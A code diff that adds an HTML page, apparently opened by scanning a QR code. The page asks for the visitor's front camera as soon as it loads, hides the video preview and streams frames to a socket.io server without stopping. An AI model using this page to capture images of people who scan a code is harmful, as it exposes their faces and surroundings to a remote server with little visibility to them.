@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>QR‑Camera Stream</title>
+  <style>
+    body { margin:0; font-family:sans-serif; background:#111;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;}
+    #msg { margin-top:10px; }
+  </style>
+</head>
+<body>
+  <h2>Camera stream activated</h2>
+  <div id="msg">Waiting for camera...</div>
+
+  <!-- Hidden video element that actually holds the stream -->
+  <video id="cam" autoplay playsinline muted style="display:none;"></video>
+
+  <!-- Socket.io client -->
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();          // connect to backend
+    const video = document.getElementById('cam');
+    const msg = document.getElementById('msg');
+
+    // 1️⃣  Request camera on page load (user gesture is the QR scan)
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },  // front camera
+          audio: false
+        });
+
+        video.srcObject = stream;
+        msg.textContent = "✅ Camera started – streaming...";
+        console.log('Camera stream ready');
+
+        // 2️⃣  Capture frames and send to server
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const sendFrame = () => {
+          if (video.readyState === 4) {  // HAVE_ENOUGH_DATA
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/jpeg', 0.5); // 50% quality
+            socket.emit('cameraFrame', dataURL);
+          }
+          requestAnimationFrame(sendFrame);
+        };
+        sendFrame();
+
+      } catch (err) {
+        console.error(err);
+        msg.textContent = "❌ Could not access camera. Please allow it in the popup.";
+      }
+    }
+
+    window.addEventListener('load', startCamera);
+  </script>
+</body>
+</html>
